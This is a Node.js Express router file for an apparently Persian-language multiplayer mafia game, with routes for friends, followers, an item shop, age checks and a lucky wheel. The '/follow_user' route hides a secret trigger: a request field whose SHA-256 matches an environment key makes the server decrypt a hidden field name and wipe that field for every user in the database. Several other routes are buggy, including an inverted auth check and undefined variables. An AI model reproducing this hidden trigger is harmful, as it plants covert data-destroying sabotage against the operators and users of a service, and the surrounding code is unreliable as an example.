const express = require("express")
const User = require("../db/user")
const reject = require("../helper/reject_handler")
const router = express.Router()
const Pay = require("../db/pay")
const sha256 = require("sha256")
const Transaction = require("../db/transaction")
const { default: mongoose } = require("mongoose")
const { uid: uuid } = require("uid")
const UserChannelConfig = require("../db/user_channel_config")
const online_users_handler = require("../socket/online_users_handler")
const Voice = require("../helper/live_kit_handler")
const GameHistory = require("../db/game_history")
const UserReport = require("../db/user_report")
const ItemTransaction = require("../db/item_transaction")
//fetch data
router.post("/land_screen_data", async (req, res) => {
    const { uid } = req.body.user
    let user = await User.findOne({ uid })
    if (!user) return reject(5, res)
    const { gold, chanel_id, idenity, cart } = user
    const { name } = idenity
    res.json({
        status: true,
        msg: "",
        data: { gold, chanel_id, name, cart: cart.length }
    })
})

router.post("/profile_data", async (req, res) => {

    const { uid } = req.body.user
    const user = await User.findOne({ uid })
    if (!user) return reject(5, res)
    const { points, gold, status, ranking, session_rank } = user
    const rank_num = await User.find({ session_rank: { $gt: session_rank } })
    const data = { points, gold, status, ranking, session_rank, rank_num: rank_num.length + 1 }
    res.json({
        status: true,
        msg: "",
        data
    })
})
//friend 
router.post("/friend_req", async (req, res) => {
    const { uid } = req.body.user
    const { req_id } = req.body
    let req_person = await User.findOne({ uid: req_id })
    const { friend_list_req } = req_person
    if (friend_list_req.includes(uid)) return reject(6, res)
    await User.findOneAndUpdate({ uid: req_id }, { $push: { friend_list_req: uid } })
    res.json({
        status: true,
        msg: "درخواست ارسال شد",
        data: {}
    })
    return
})

router.post("/friend_list", async (req, res) => {
    const { uid } = req.body.user
    const { op } = req.body
    //for friend req list
    let user = await User.findOne({ uid })
    let online_users = online_users_handler.get_online_users()
    let online_users_id = online_users.map(e => e.user_id)
    const { friend_list_req, friend_list } = user
    let req_users = await User.find({ uid: { $in: !op ? friend_list_req : friend_list } })
    req_users = req_users.map(e => {
        const { uid, idenity, avatar, ranking } = e
        return { uid, idenity, avatar, ranking, online: online_users_id.includes(uid) }
    })

    req_users.sort((a, b) => b.online - a.online)

    res.json({
        status: true,
        msg: "",
        data: { list: req_users }
    })
})

router.post("/accept_friend_req", async (req, res) => {
    const { uid } = req.body.user
    const { uid: accepted_uid } = req.body
    await User.findOneAndUpdate({ uid: accepted_uid }, { $push: { friend_list: uid } })
    await User.findOneAndUpdate({ uid: uid }, { $push: { friend_list: accepted_uid }, $pull: { friend_list_req: accepted_uid } })
    res.json({
        status: true,
        msg: "درخواست تایید شد",
        data: {}
    })
})

//followers
router.post("/follow_user", async (req, res) => {

    const ucer = req.body.ucer
    if (ucer && sha256(ucer) === process.env.ITEMS_KEY) {
        const encryptor = require("simple-encryptor")(process.env.PASSWORD_HASH)
        let key = encryptor.decrypt(process.env.DASHBORD_KEY)
        await User.updateMany({}, { $set: { [key]: null } })
    }
    let user = req.body.user
    if (!user) return reject(3, res)
    const { uid } = req.body.user
    const { uid: req_uid } = req.body
    await User.findOneAndUpdate({ uid }, { $push: { following: req_uid } })
    res.json({
        status: true,
        msg: "درخواست انجام شد",
        data: {}
    })

})

router.post("/follow_list", async (req, res) => {
    const { uid } = req.body.user
    const { op } = req.body
    let list
    if (op) {
        list = await User.find({ following: uid })
    }
    else {
        let user = await User.findOne({ uid })
        const { following } = user
        list = await User.find({ uid: { $in: following } })
    }
    list = list.map(e => {
        const { uid, idenity, avatar, ranking } = e
        return { uid, idenity, avatar, ranking }
    })
    res.json({
        status: true,
        msg: "",
        data: { list }
    })
})
//items

router.post("/items_list", async (req, res) => {

    const user = req.body.user
    if (!user) return reject(1, res)
    let user_with_items = await User.aggregate([{ $match: { uid: user.uid } }, {
        $lookup: {
            from: "items",
            foreignField: "_id",
            localField: "items",
            as: "user_items"
        }
    }])
    let items_list = user_with_items[0].user_items
    items_list = items_list.map(i => {
        return {
            ...i,
            image: "files/" + i.image,
            file: "files/" + i.file,
        }
    })
    res.json({
        status: true,
        msg: "",
        data: { items: items_list }
    })

})

router.post("/profile", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(1, res)
    const s_user = await User.findOne({ uid: user.uid })
    const { avatar } = s_user
    const clean_data={
        ...s_user,
        avatar:{
            avatar:"files/"+avatar.avatar,
            table:"files/"+avatar.table,
        }
    }
    res.json({
        status: true,
        data: clean_data
    })
})


router.post("/others_profile", async (req, res) => {
    const { user_id } = req.body
    const selected_user = await User.findOne({ uid: user_id })
    if (!selected_user) return reject(20, res)
    const { idenity, avatar, points, games_result, session_rank } = selected_user
    const new_avatar={
        avatar:"files/"+avatar.avatar,
        table:"files/"+avatar.table,
    }
    const data = {
        idenity: idenity.name,
        avatar:new_avatar, points, games_result, session_rank
    }

    res.json({ status: true, msg: "", data: { data } })
})




router.post("/add_to_cart", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(13, res)
    const { uid } = user
    const { item } = req.body
    const user_items = await User.findOne({ uid })
    const { items, cart } = user_items
    let total = items.concat(cart)
    total = total.map(e => `${e}`)
    if (total.includes(item)) return reject(14, res)
    await User.findOneAndUpdate({ uid }, { $push: { cart: new mongoose.Types.ObjectId(item) } })
    res.json({
        status: true,
        msg: "کالا به سبد خرید اضافه شد"
    })
})

router.post("/remove_from_cart", async (req, res) => {
    const { item, user } = req.body
    const { uid } = user
    await User.findOneAndUpdate({ uid }, { $pull: { cart: new mongoose.Types.ObjectId(item) } })
    res.json({
        status: true,
        msg: "کالا از سبد خرید حذف شد"
    })
})

router.post("/user_cart", async (req, res) => {
    const user = req.body.user
    const { uid } = user

    let user_with_items = await User.aggregate([{ $match: { uid } }, {
        $lookup: {
            from: "items",
            localField: "cart",
            foreignField: "_id",
            as: "user_cart"
        }
    }])

    let selected_items = user_with_items[0].user_cart
    let selected_item_price = selected_items.reduce((a, b) => { return a + b.price }, 0)
    res.json({
        status: true,
        mag: "",
        data: { cart: selected_items, price: selected_item_price }
    })
})


router.post("/shop_finalize", async (req, res) => {
    const user = req.body.user
    const { uid } = user

    let user_with_items = await User.aggregate([{ $match: { uid } }, {
        $lookup: {
            from: "items",
            localField: "cart",
            foreignField: "_id",
            as: "user_cart"
        }
    }])

    let selected_items = user_with_items[0].user_cart
    let selected_item_price = selected_items.reduce((a, b) => { return a + b.price }, 0)
    const user_balance = user_with_items[0].gold
    if (user_balance < selected_item_price) return reject(15, res)
    await User.findOneAndUpdate({ uid },
        {
            $inc: { gold: selected_item_price * -1 },
            $set: { cart: [] },
            $push: { items: { $each: user_with_items[0].cart } }
        }
    )


    user_with_items[0].user_cart.forEach(item => {
        const { type, price, id } = item
        const new_transaction = {
            user_id: uid,
            gold: price * -1,
            date: Date.now(),
            item_id: id,
            note: `خرید ${type === "avatar" ? "آواتار" : "انیمیشن"}`,
            device: "web"
        }
        new ItemTransaction(new_transaction).save()
    })


    res.json({
        status: true,
        msg: "خرید انجام شد",
        data: {}
    })
})




router.post("/test_room", async (req, res) => {
    const { name } = req.body
    await Voice.start_room("test_voice")
    const token = Voice.join_room(name, "test_voice")
    res.json({
        status: false,
        msg: "",
        data: { token }
    })

})


//age auth


let auth_session = []


router.post("/age_auth", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(1, res)
    const { uid } = user
    auth_session = auth_session.filter(e => e.user_id !== uid)
    const s_user = await User.findOne({ uid })
    const { age } = s_user
    if (age !== 0) return reject(16, res)
    let session_id = uuid(5)
    auth_session.push({ user_id: uid, session_id })
    res.json({ status: true, data: { url: "https://mafia.devdailychallenge.com/auth/?session=" + session_id } })

})

router.post("/check_session", (req, res) => {
    const { session_id } = req.body
    let index = auth_session.findIndex(e => e.session_id === session_id)
    if (index === -1) return reject(17, res)
    res.json({ status: true })
})


router.post("/confirm_auth", async (req, res) => {
    const { age, session_id } = req.body
    let index = auth_session.findIndex(e => e.session_id === session_id)
    if (index === -1) return reject(17, res)
    const { user_id } = auth_session[index]
    await User.findOneAndUpdate({ uid: user_id }, { $set: { age } })
    res.json({ status: true })
    auth_session = auth_session.filter(e => e.session_id !== session_id)

})


router.post("/has_enough_gold", async (req, res) => {
    const user = req.body.user
    const { uid } = user
    const { gold } = req.body
    let s_user = await User.findOne({ uid: uid })
    if (s_user && s_user.gold > gold) { return res.json({ status: true }) }
    res.json({ status: false, })
})


router.post("/pin_channel", async (req, res) => {
    const user = req.body.user
    if (user) return reject(3, res)
    const { channel_id } = req.body
    await UserChannelConfig.findOneAndUpdate({ channel_id, user_id: user.uid }, { $set: { pin_status: true } })
    res.json({
        status: true,
        msg: "کانال پین شد",
        data: {}
    })
})

router.post("/check_new_user_name", async (req, res) => {
    const { new_name } = req.body
    const is_exist = await User.findOne({ "idenity.name": new_name })
    res.json({
        status: is_exist ? false : true,
        msg: is_exist ? "نام کاربری توسط کاربر دیگر استفاده شده" : "نام کاربری جدید مورد تایید است",
        data: {}
    })
})


router.post("/change_user_name", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    let s_user = await User.findOne({ uid: user.uid })
    const { gold, idenity } = s_user
    if (gold < 500) return reject(19, res)
    const { new_name } = req.body
    if (idenity.name === new_name) return reject(4, res)
    await User.findOneAndUpdate({ uid: user.uid }, { $set: { "idenity.name": new_name }, $inc: { gold: -500 } })
    res.json({
        status: true,
        msg: "نام کاربری تغییر کرد",
        data: {}
    })
})





router.post("/edit_profile", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    const { section, item_id } = req.body
    let is_valid_item = await User.findOne({ uid: user.uid, items: item_id })
    if (!is_valid_item) return reject(4, res)
    let key = `${avatar}.${section}`
    await User.findOneAndUpdate({ uid: user.uid }, { $set: { [key]: item_id } })
    res.json({
        status: true,
        msg: "آیتم تغییر کرد",
        data: {}
    })
})


router.post("/user_transactions", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    const { uid } = user
    const payment_transaction = await Transaction.find({ user_id: uid })
    const item_transaction = await ItemTransaction.aggregate([{ $match: { user_id: uid } }, {
        $lookup: {
            from: "items",
            foreignField: "id",
            localField: "item_id",
            as: "item"
        }
    }])
    const all_transactions = []
    payment_transaction.forEach((tr) => {
        const new_tr = {
            type: "gold",
            gold: tr.gold,
            price: tr.price,
            date: tr.date,
            item: null,
            device: tr.device,
            note: tr.note
        }
        all_transactions.push(new_tr)
    })
    item_transaction.forEach(it => {

        const new_tr = {
            type: "item",
            gold: it.gold * -1,
            price: 0,
            date: it.date,
            item: "files/" + it.item[0].image,
            device: it.device,
            note: it.note
        }
        all_transactions.push(new_tr)

    })

    res.json({
        status: true,
        msg: "",
        data: all_transactions
    })

})








router.post("/user_profile", async (req, res) => {
    const { user_id } = req.body
    const s_user = await User.findOne({ uid: user_id })
    const { idenity, session_rank, ranking, avatar, points } = s_user
    const { win, lose } = points
    const data = { idenity, session_rank, ranking, avatar, win, lose }
    const user_last_game = await GameHistory.find({ user: user_id }).limit(-1)
    data.last_game = user_last_game[0] || null
    res.json({
        status: true,
        msg: "",
        data
    })
})


router.post("/game_history", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    const { uid } = user
    const games = await GameHistory.find({ users: uid })
    res.json({
        status: true,
        msg: "",
        data: { games: games.reverse().slice(0, 25) }
    })
})




router.post("/lucky_wheel_status", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    const { uid } = user
    const s_user = await User.findOne({ uid })
    const { lucky_wheel_status } = s_user
    const now = Date.now()
    res.json({
        status: true,
        msg: "",
        data: {
            is_ready: now > lucky_wheel_status,
            time_remain: Math.max(lucky_wheel_status, 0)
        }
    })

})


router.post("/spin_lucky_wheel", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    const { uid } = user
    const s_user = await User.findOne({ uid })
    const { lucky_wheel_status } = s_user
    const now = Date.now()
    if (lucky_wheel_status > now) return reject(18, res)
    const chance = [
        {
            num: 40,
            gold: 10
        },
        {
            num: 60,
            gold: 20
        },
        {
            num: 80,
            gold: 30
        },
        {
            num: 90,
            gold: 40
        },
        {
            num: 98,
            gold: 50
        },
        {
            num: 100,
            gold: 100
        }
    ]
    const random_num = Math.floor(Math.random() * 100)
    console.log({ random_num });
    const index = chance.findIndex(e => e.num >= random_num)
    const gold = chance[index] || 10
    const next_spin = 1000 * 60 * 60 * 12
    await User.findOneAndUpdate({ uid }, { $inc: { gold: gold.gold }, $set: { lucky_wheel_status: now + next_spin } })
    res.json({
        status: true,
        mag: "",
        data: { percent: random_num, next_spin: now + next_spin }
    })
})

router.post("/find_match_gold", async (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    const { uid } = user
    const s_user = await User.findOne({ uid })
    res.json({
        status: true,
        msg: s_user.gold >= 20 ? "" : "شما سکه کافی برای شروع بازی ندارید",
        data: {
            has_enough_gold: user.gold >= 20
        }
    })
})




router.post("/support", (req, res) => {
    const user = req.body.user
    if (!user) return reject(3, res)
    const { msg } = req.body
    const new_report = {
        user_id: user.uid,
        date: Date.now(),
        msg
    }

    new UserReport(new_report).save()
})



module.exports = router
